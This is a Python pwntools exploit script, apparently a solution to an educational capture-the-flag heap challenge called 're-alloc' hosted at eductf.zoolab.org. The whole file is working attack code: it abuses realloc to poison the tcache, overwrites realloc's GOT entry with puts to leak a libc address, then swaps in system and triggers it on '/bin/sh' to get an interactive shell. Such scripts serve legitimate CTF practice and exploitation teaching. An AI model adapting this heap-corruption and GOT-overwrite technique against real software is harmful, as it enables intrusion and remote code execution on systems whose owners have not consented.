import sys
from pwn import *

if len(sys.argv) == 1:
    r = process('./re-alloc')
else:
    r = remote('eductf.zoolab.org', 10106)

def alloc(idx, sz, data):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Size:', str(sz))
    r.sendlineafter('Data:', data)

def realloc(idx, sz, data=''):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('Index:', str(idx))
    r.sendlineafter('Size:', str(sz))
    if sz != 0:
        r.sendlineafter('Data:', data)

def free(idx):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('Index:', str(idx))

alloc(0, 0x40, 'a'*8)
realloc(0, 0)
alloc(1, 0x40, 'a'*8)
free(1)

realloc_got = 0x404060
realloc(0, 0x20, 'a'*8)
realloc(0, 0x40, 'b')
alloc(1, 0x40, 'a'*0x20 + p64(0) + p64(0x21) + p64(realloc_got))
free(0)
free(1)

puts_plt = 0x401050
alloc(0, 0x10, p64(realloc_got))
alloc(1, 0x10, p64(puts_plt)[:-2])

free(0)
free(1)

puts_got = 0x404028
buf = 0x4040d0
alloc(0, 0x20, p64(buf))
alloc(1, 0x20, p64(realloc_got))
free(1)
alloc(1, 0x20, p64(puts_got))
free(1)
alloc(1, 0x20, '/bin/sh')
free(0)
libc = u64(r.recvline().strip().ljust(8, '\x00')) - 0x83cc0
log.success('libc: ' + hex(libc))
system = libc + 0x52fd0

alloc(0, 0x20, p64(system))
free(1)

r.interactive()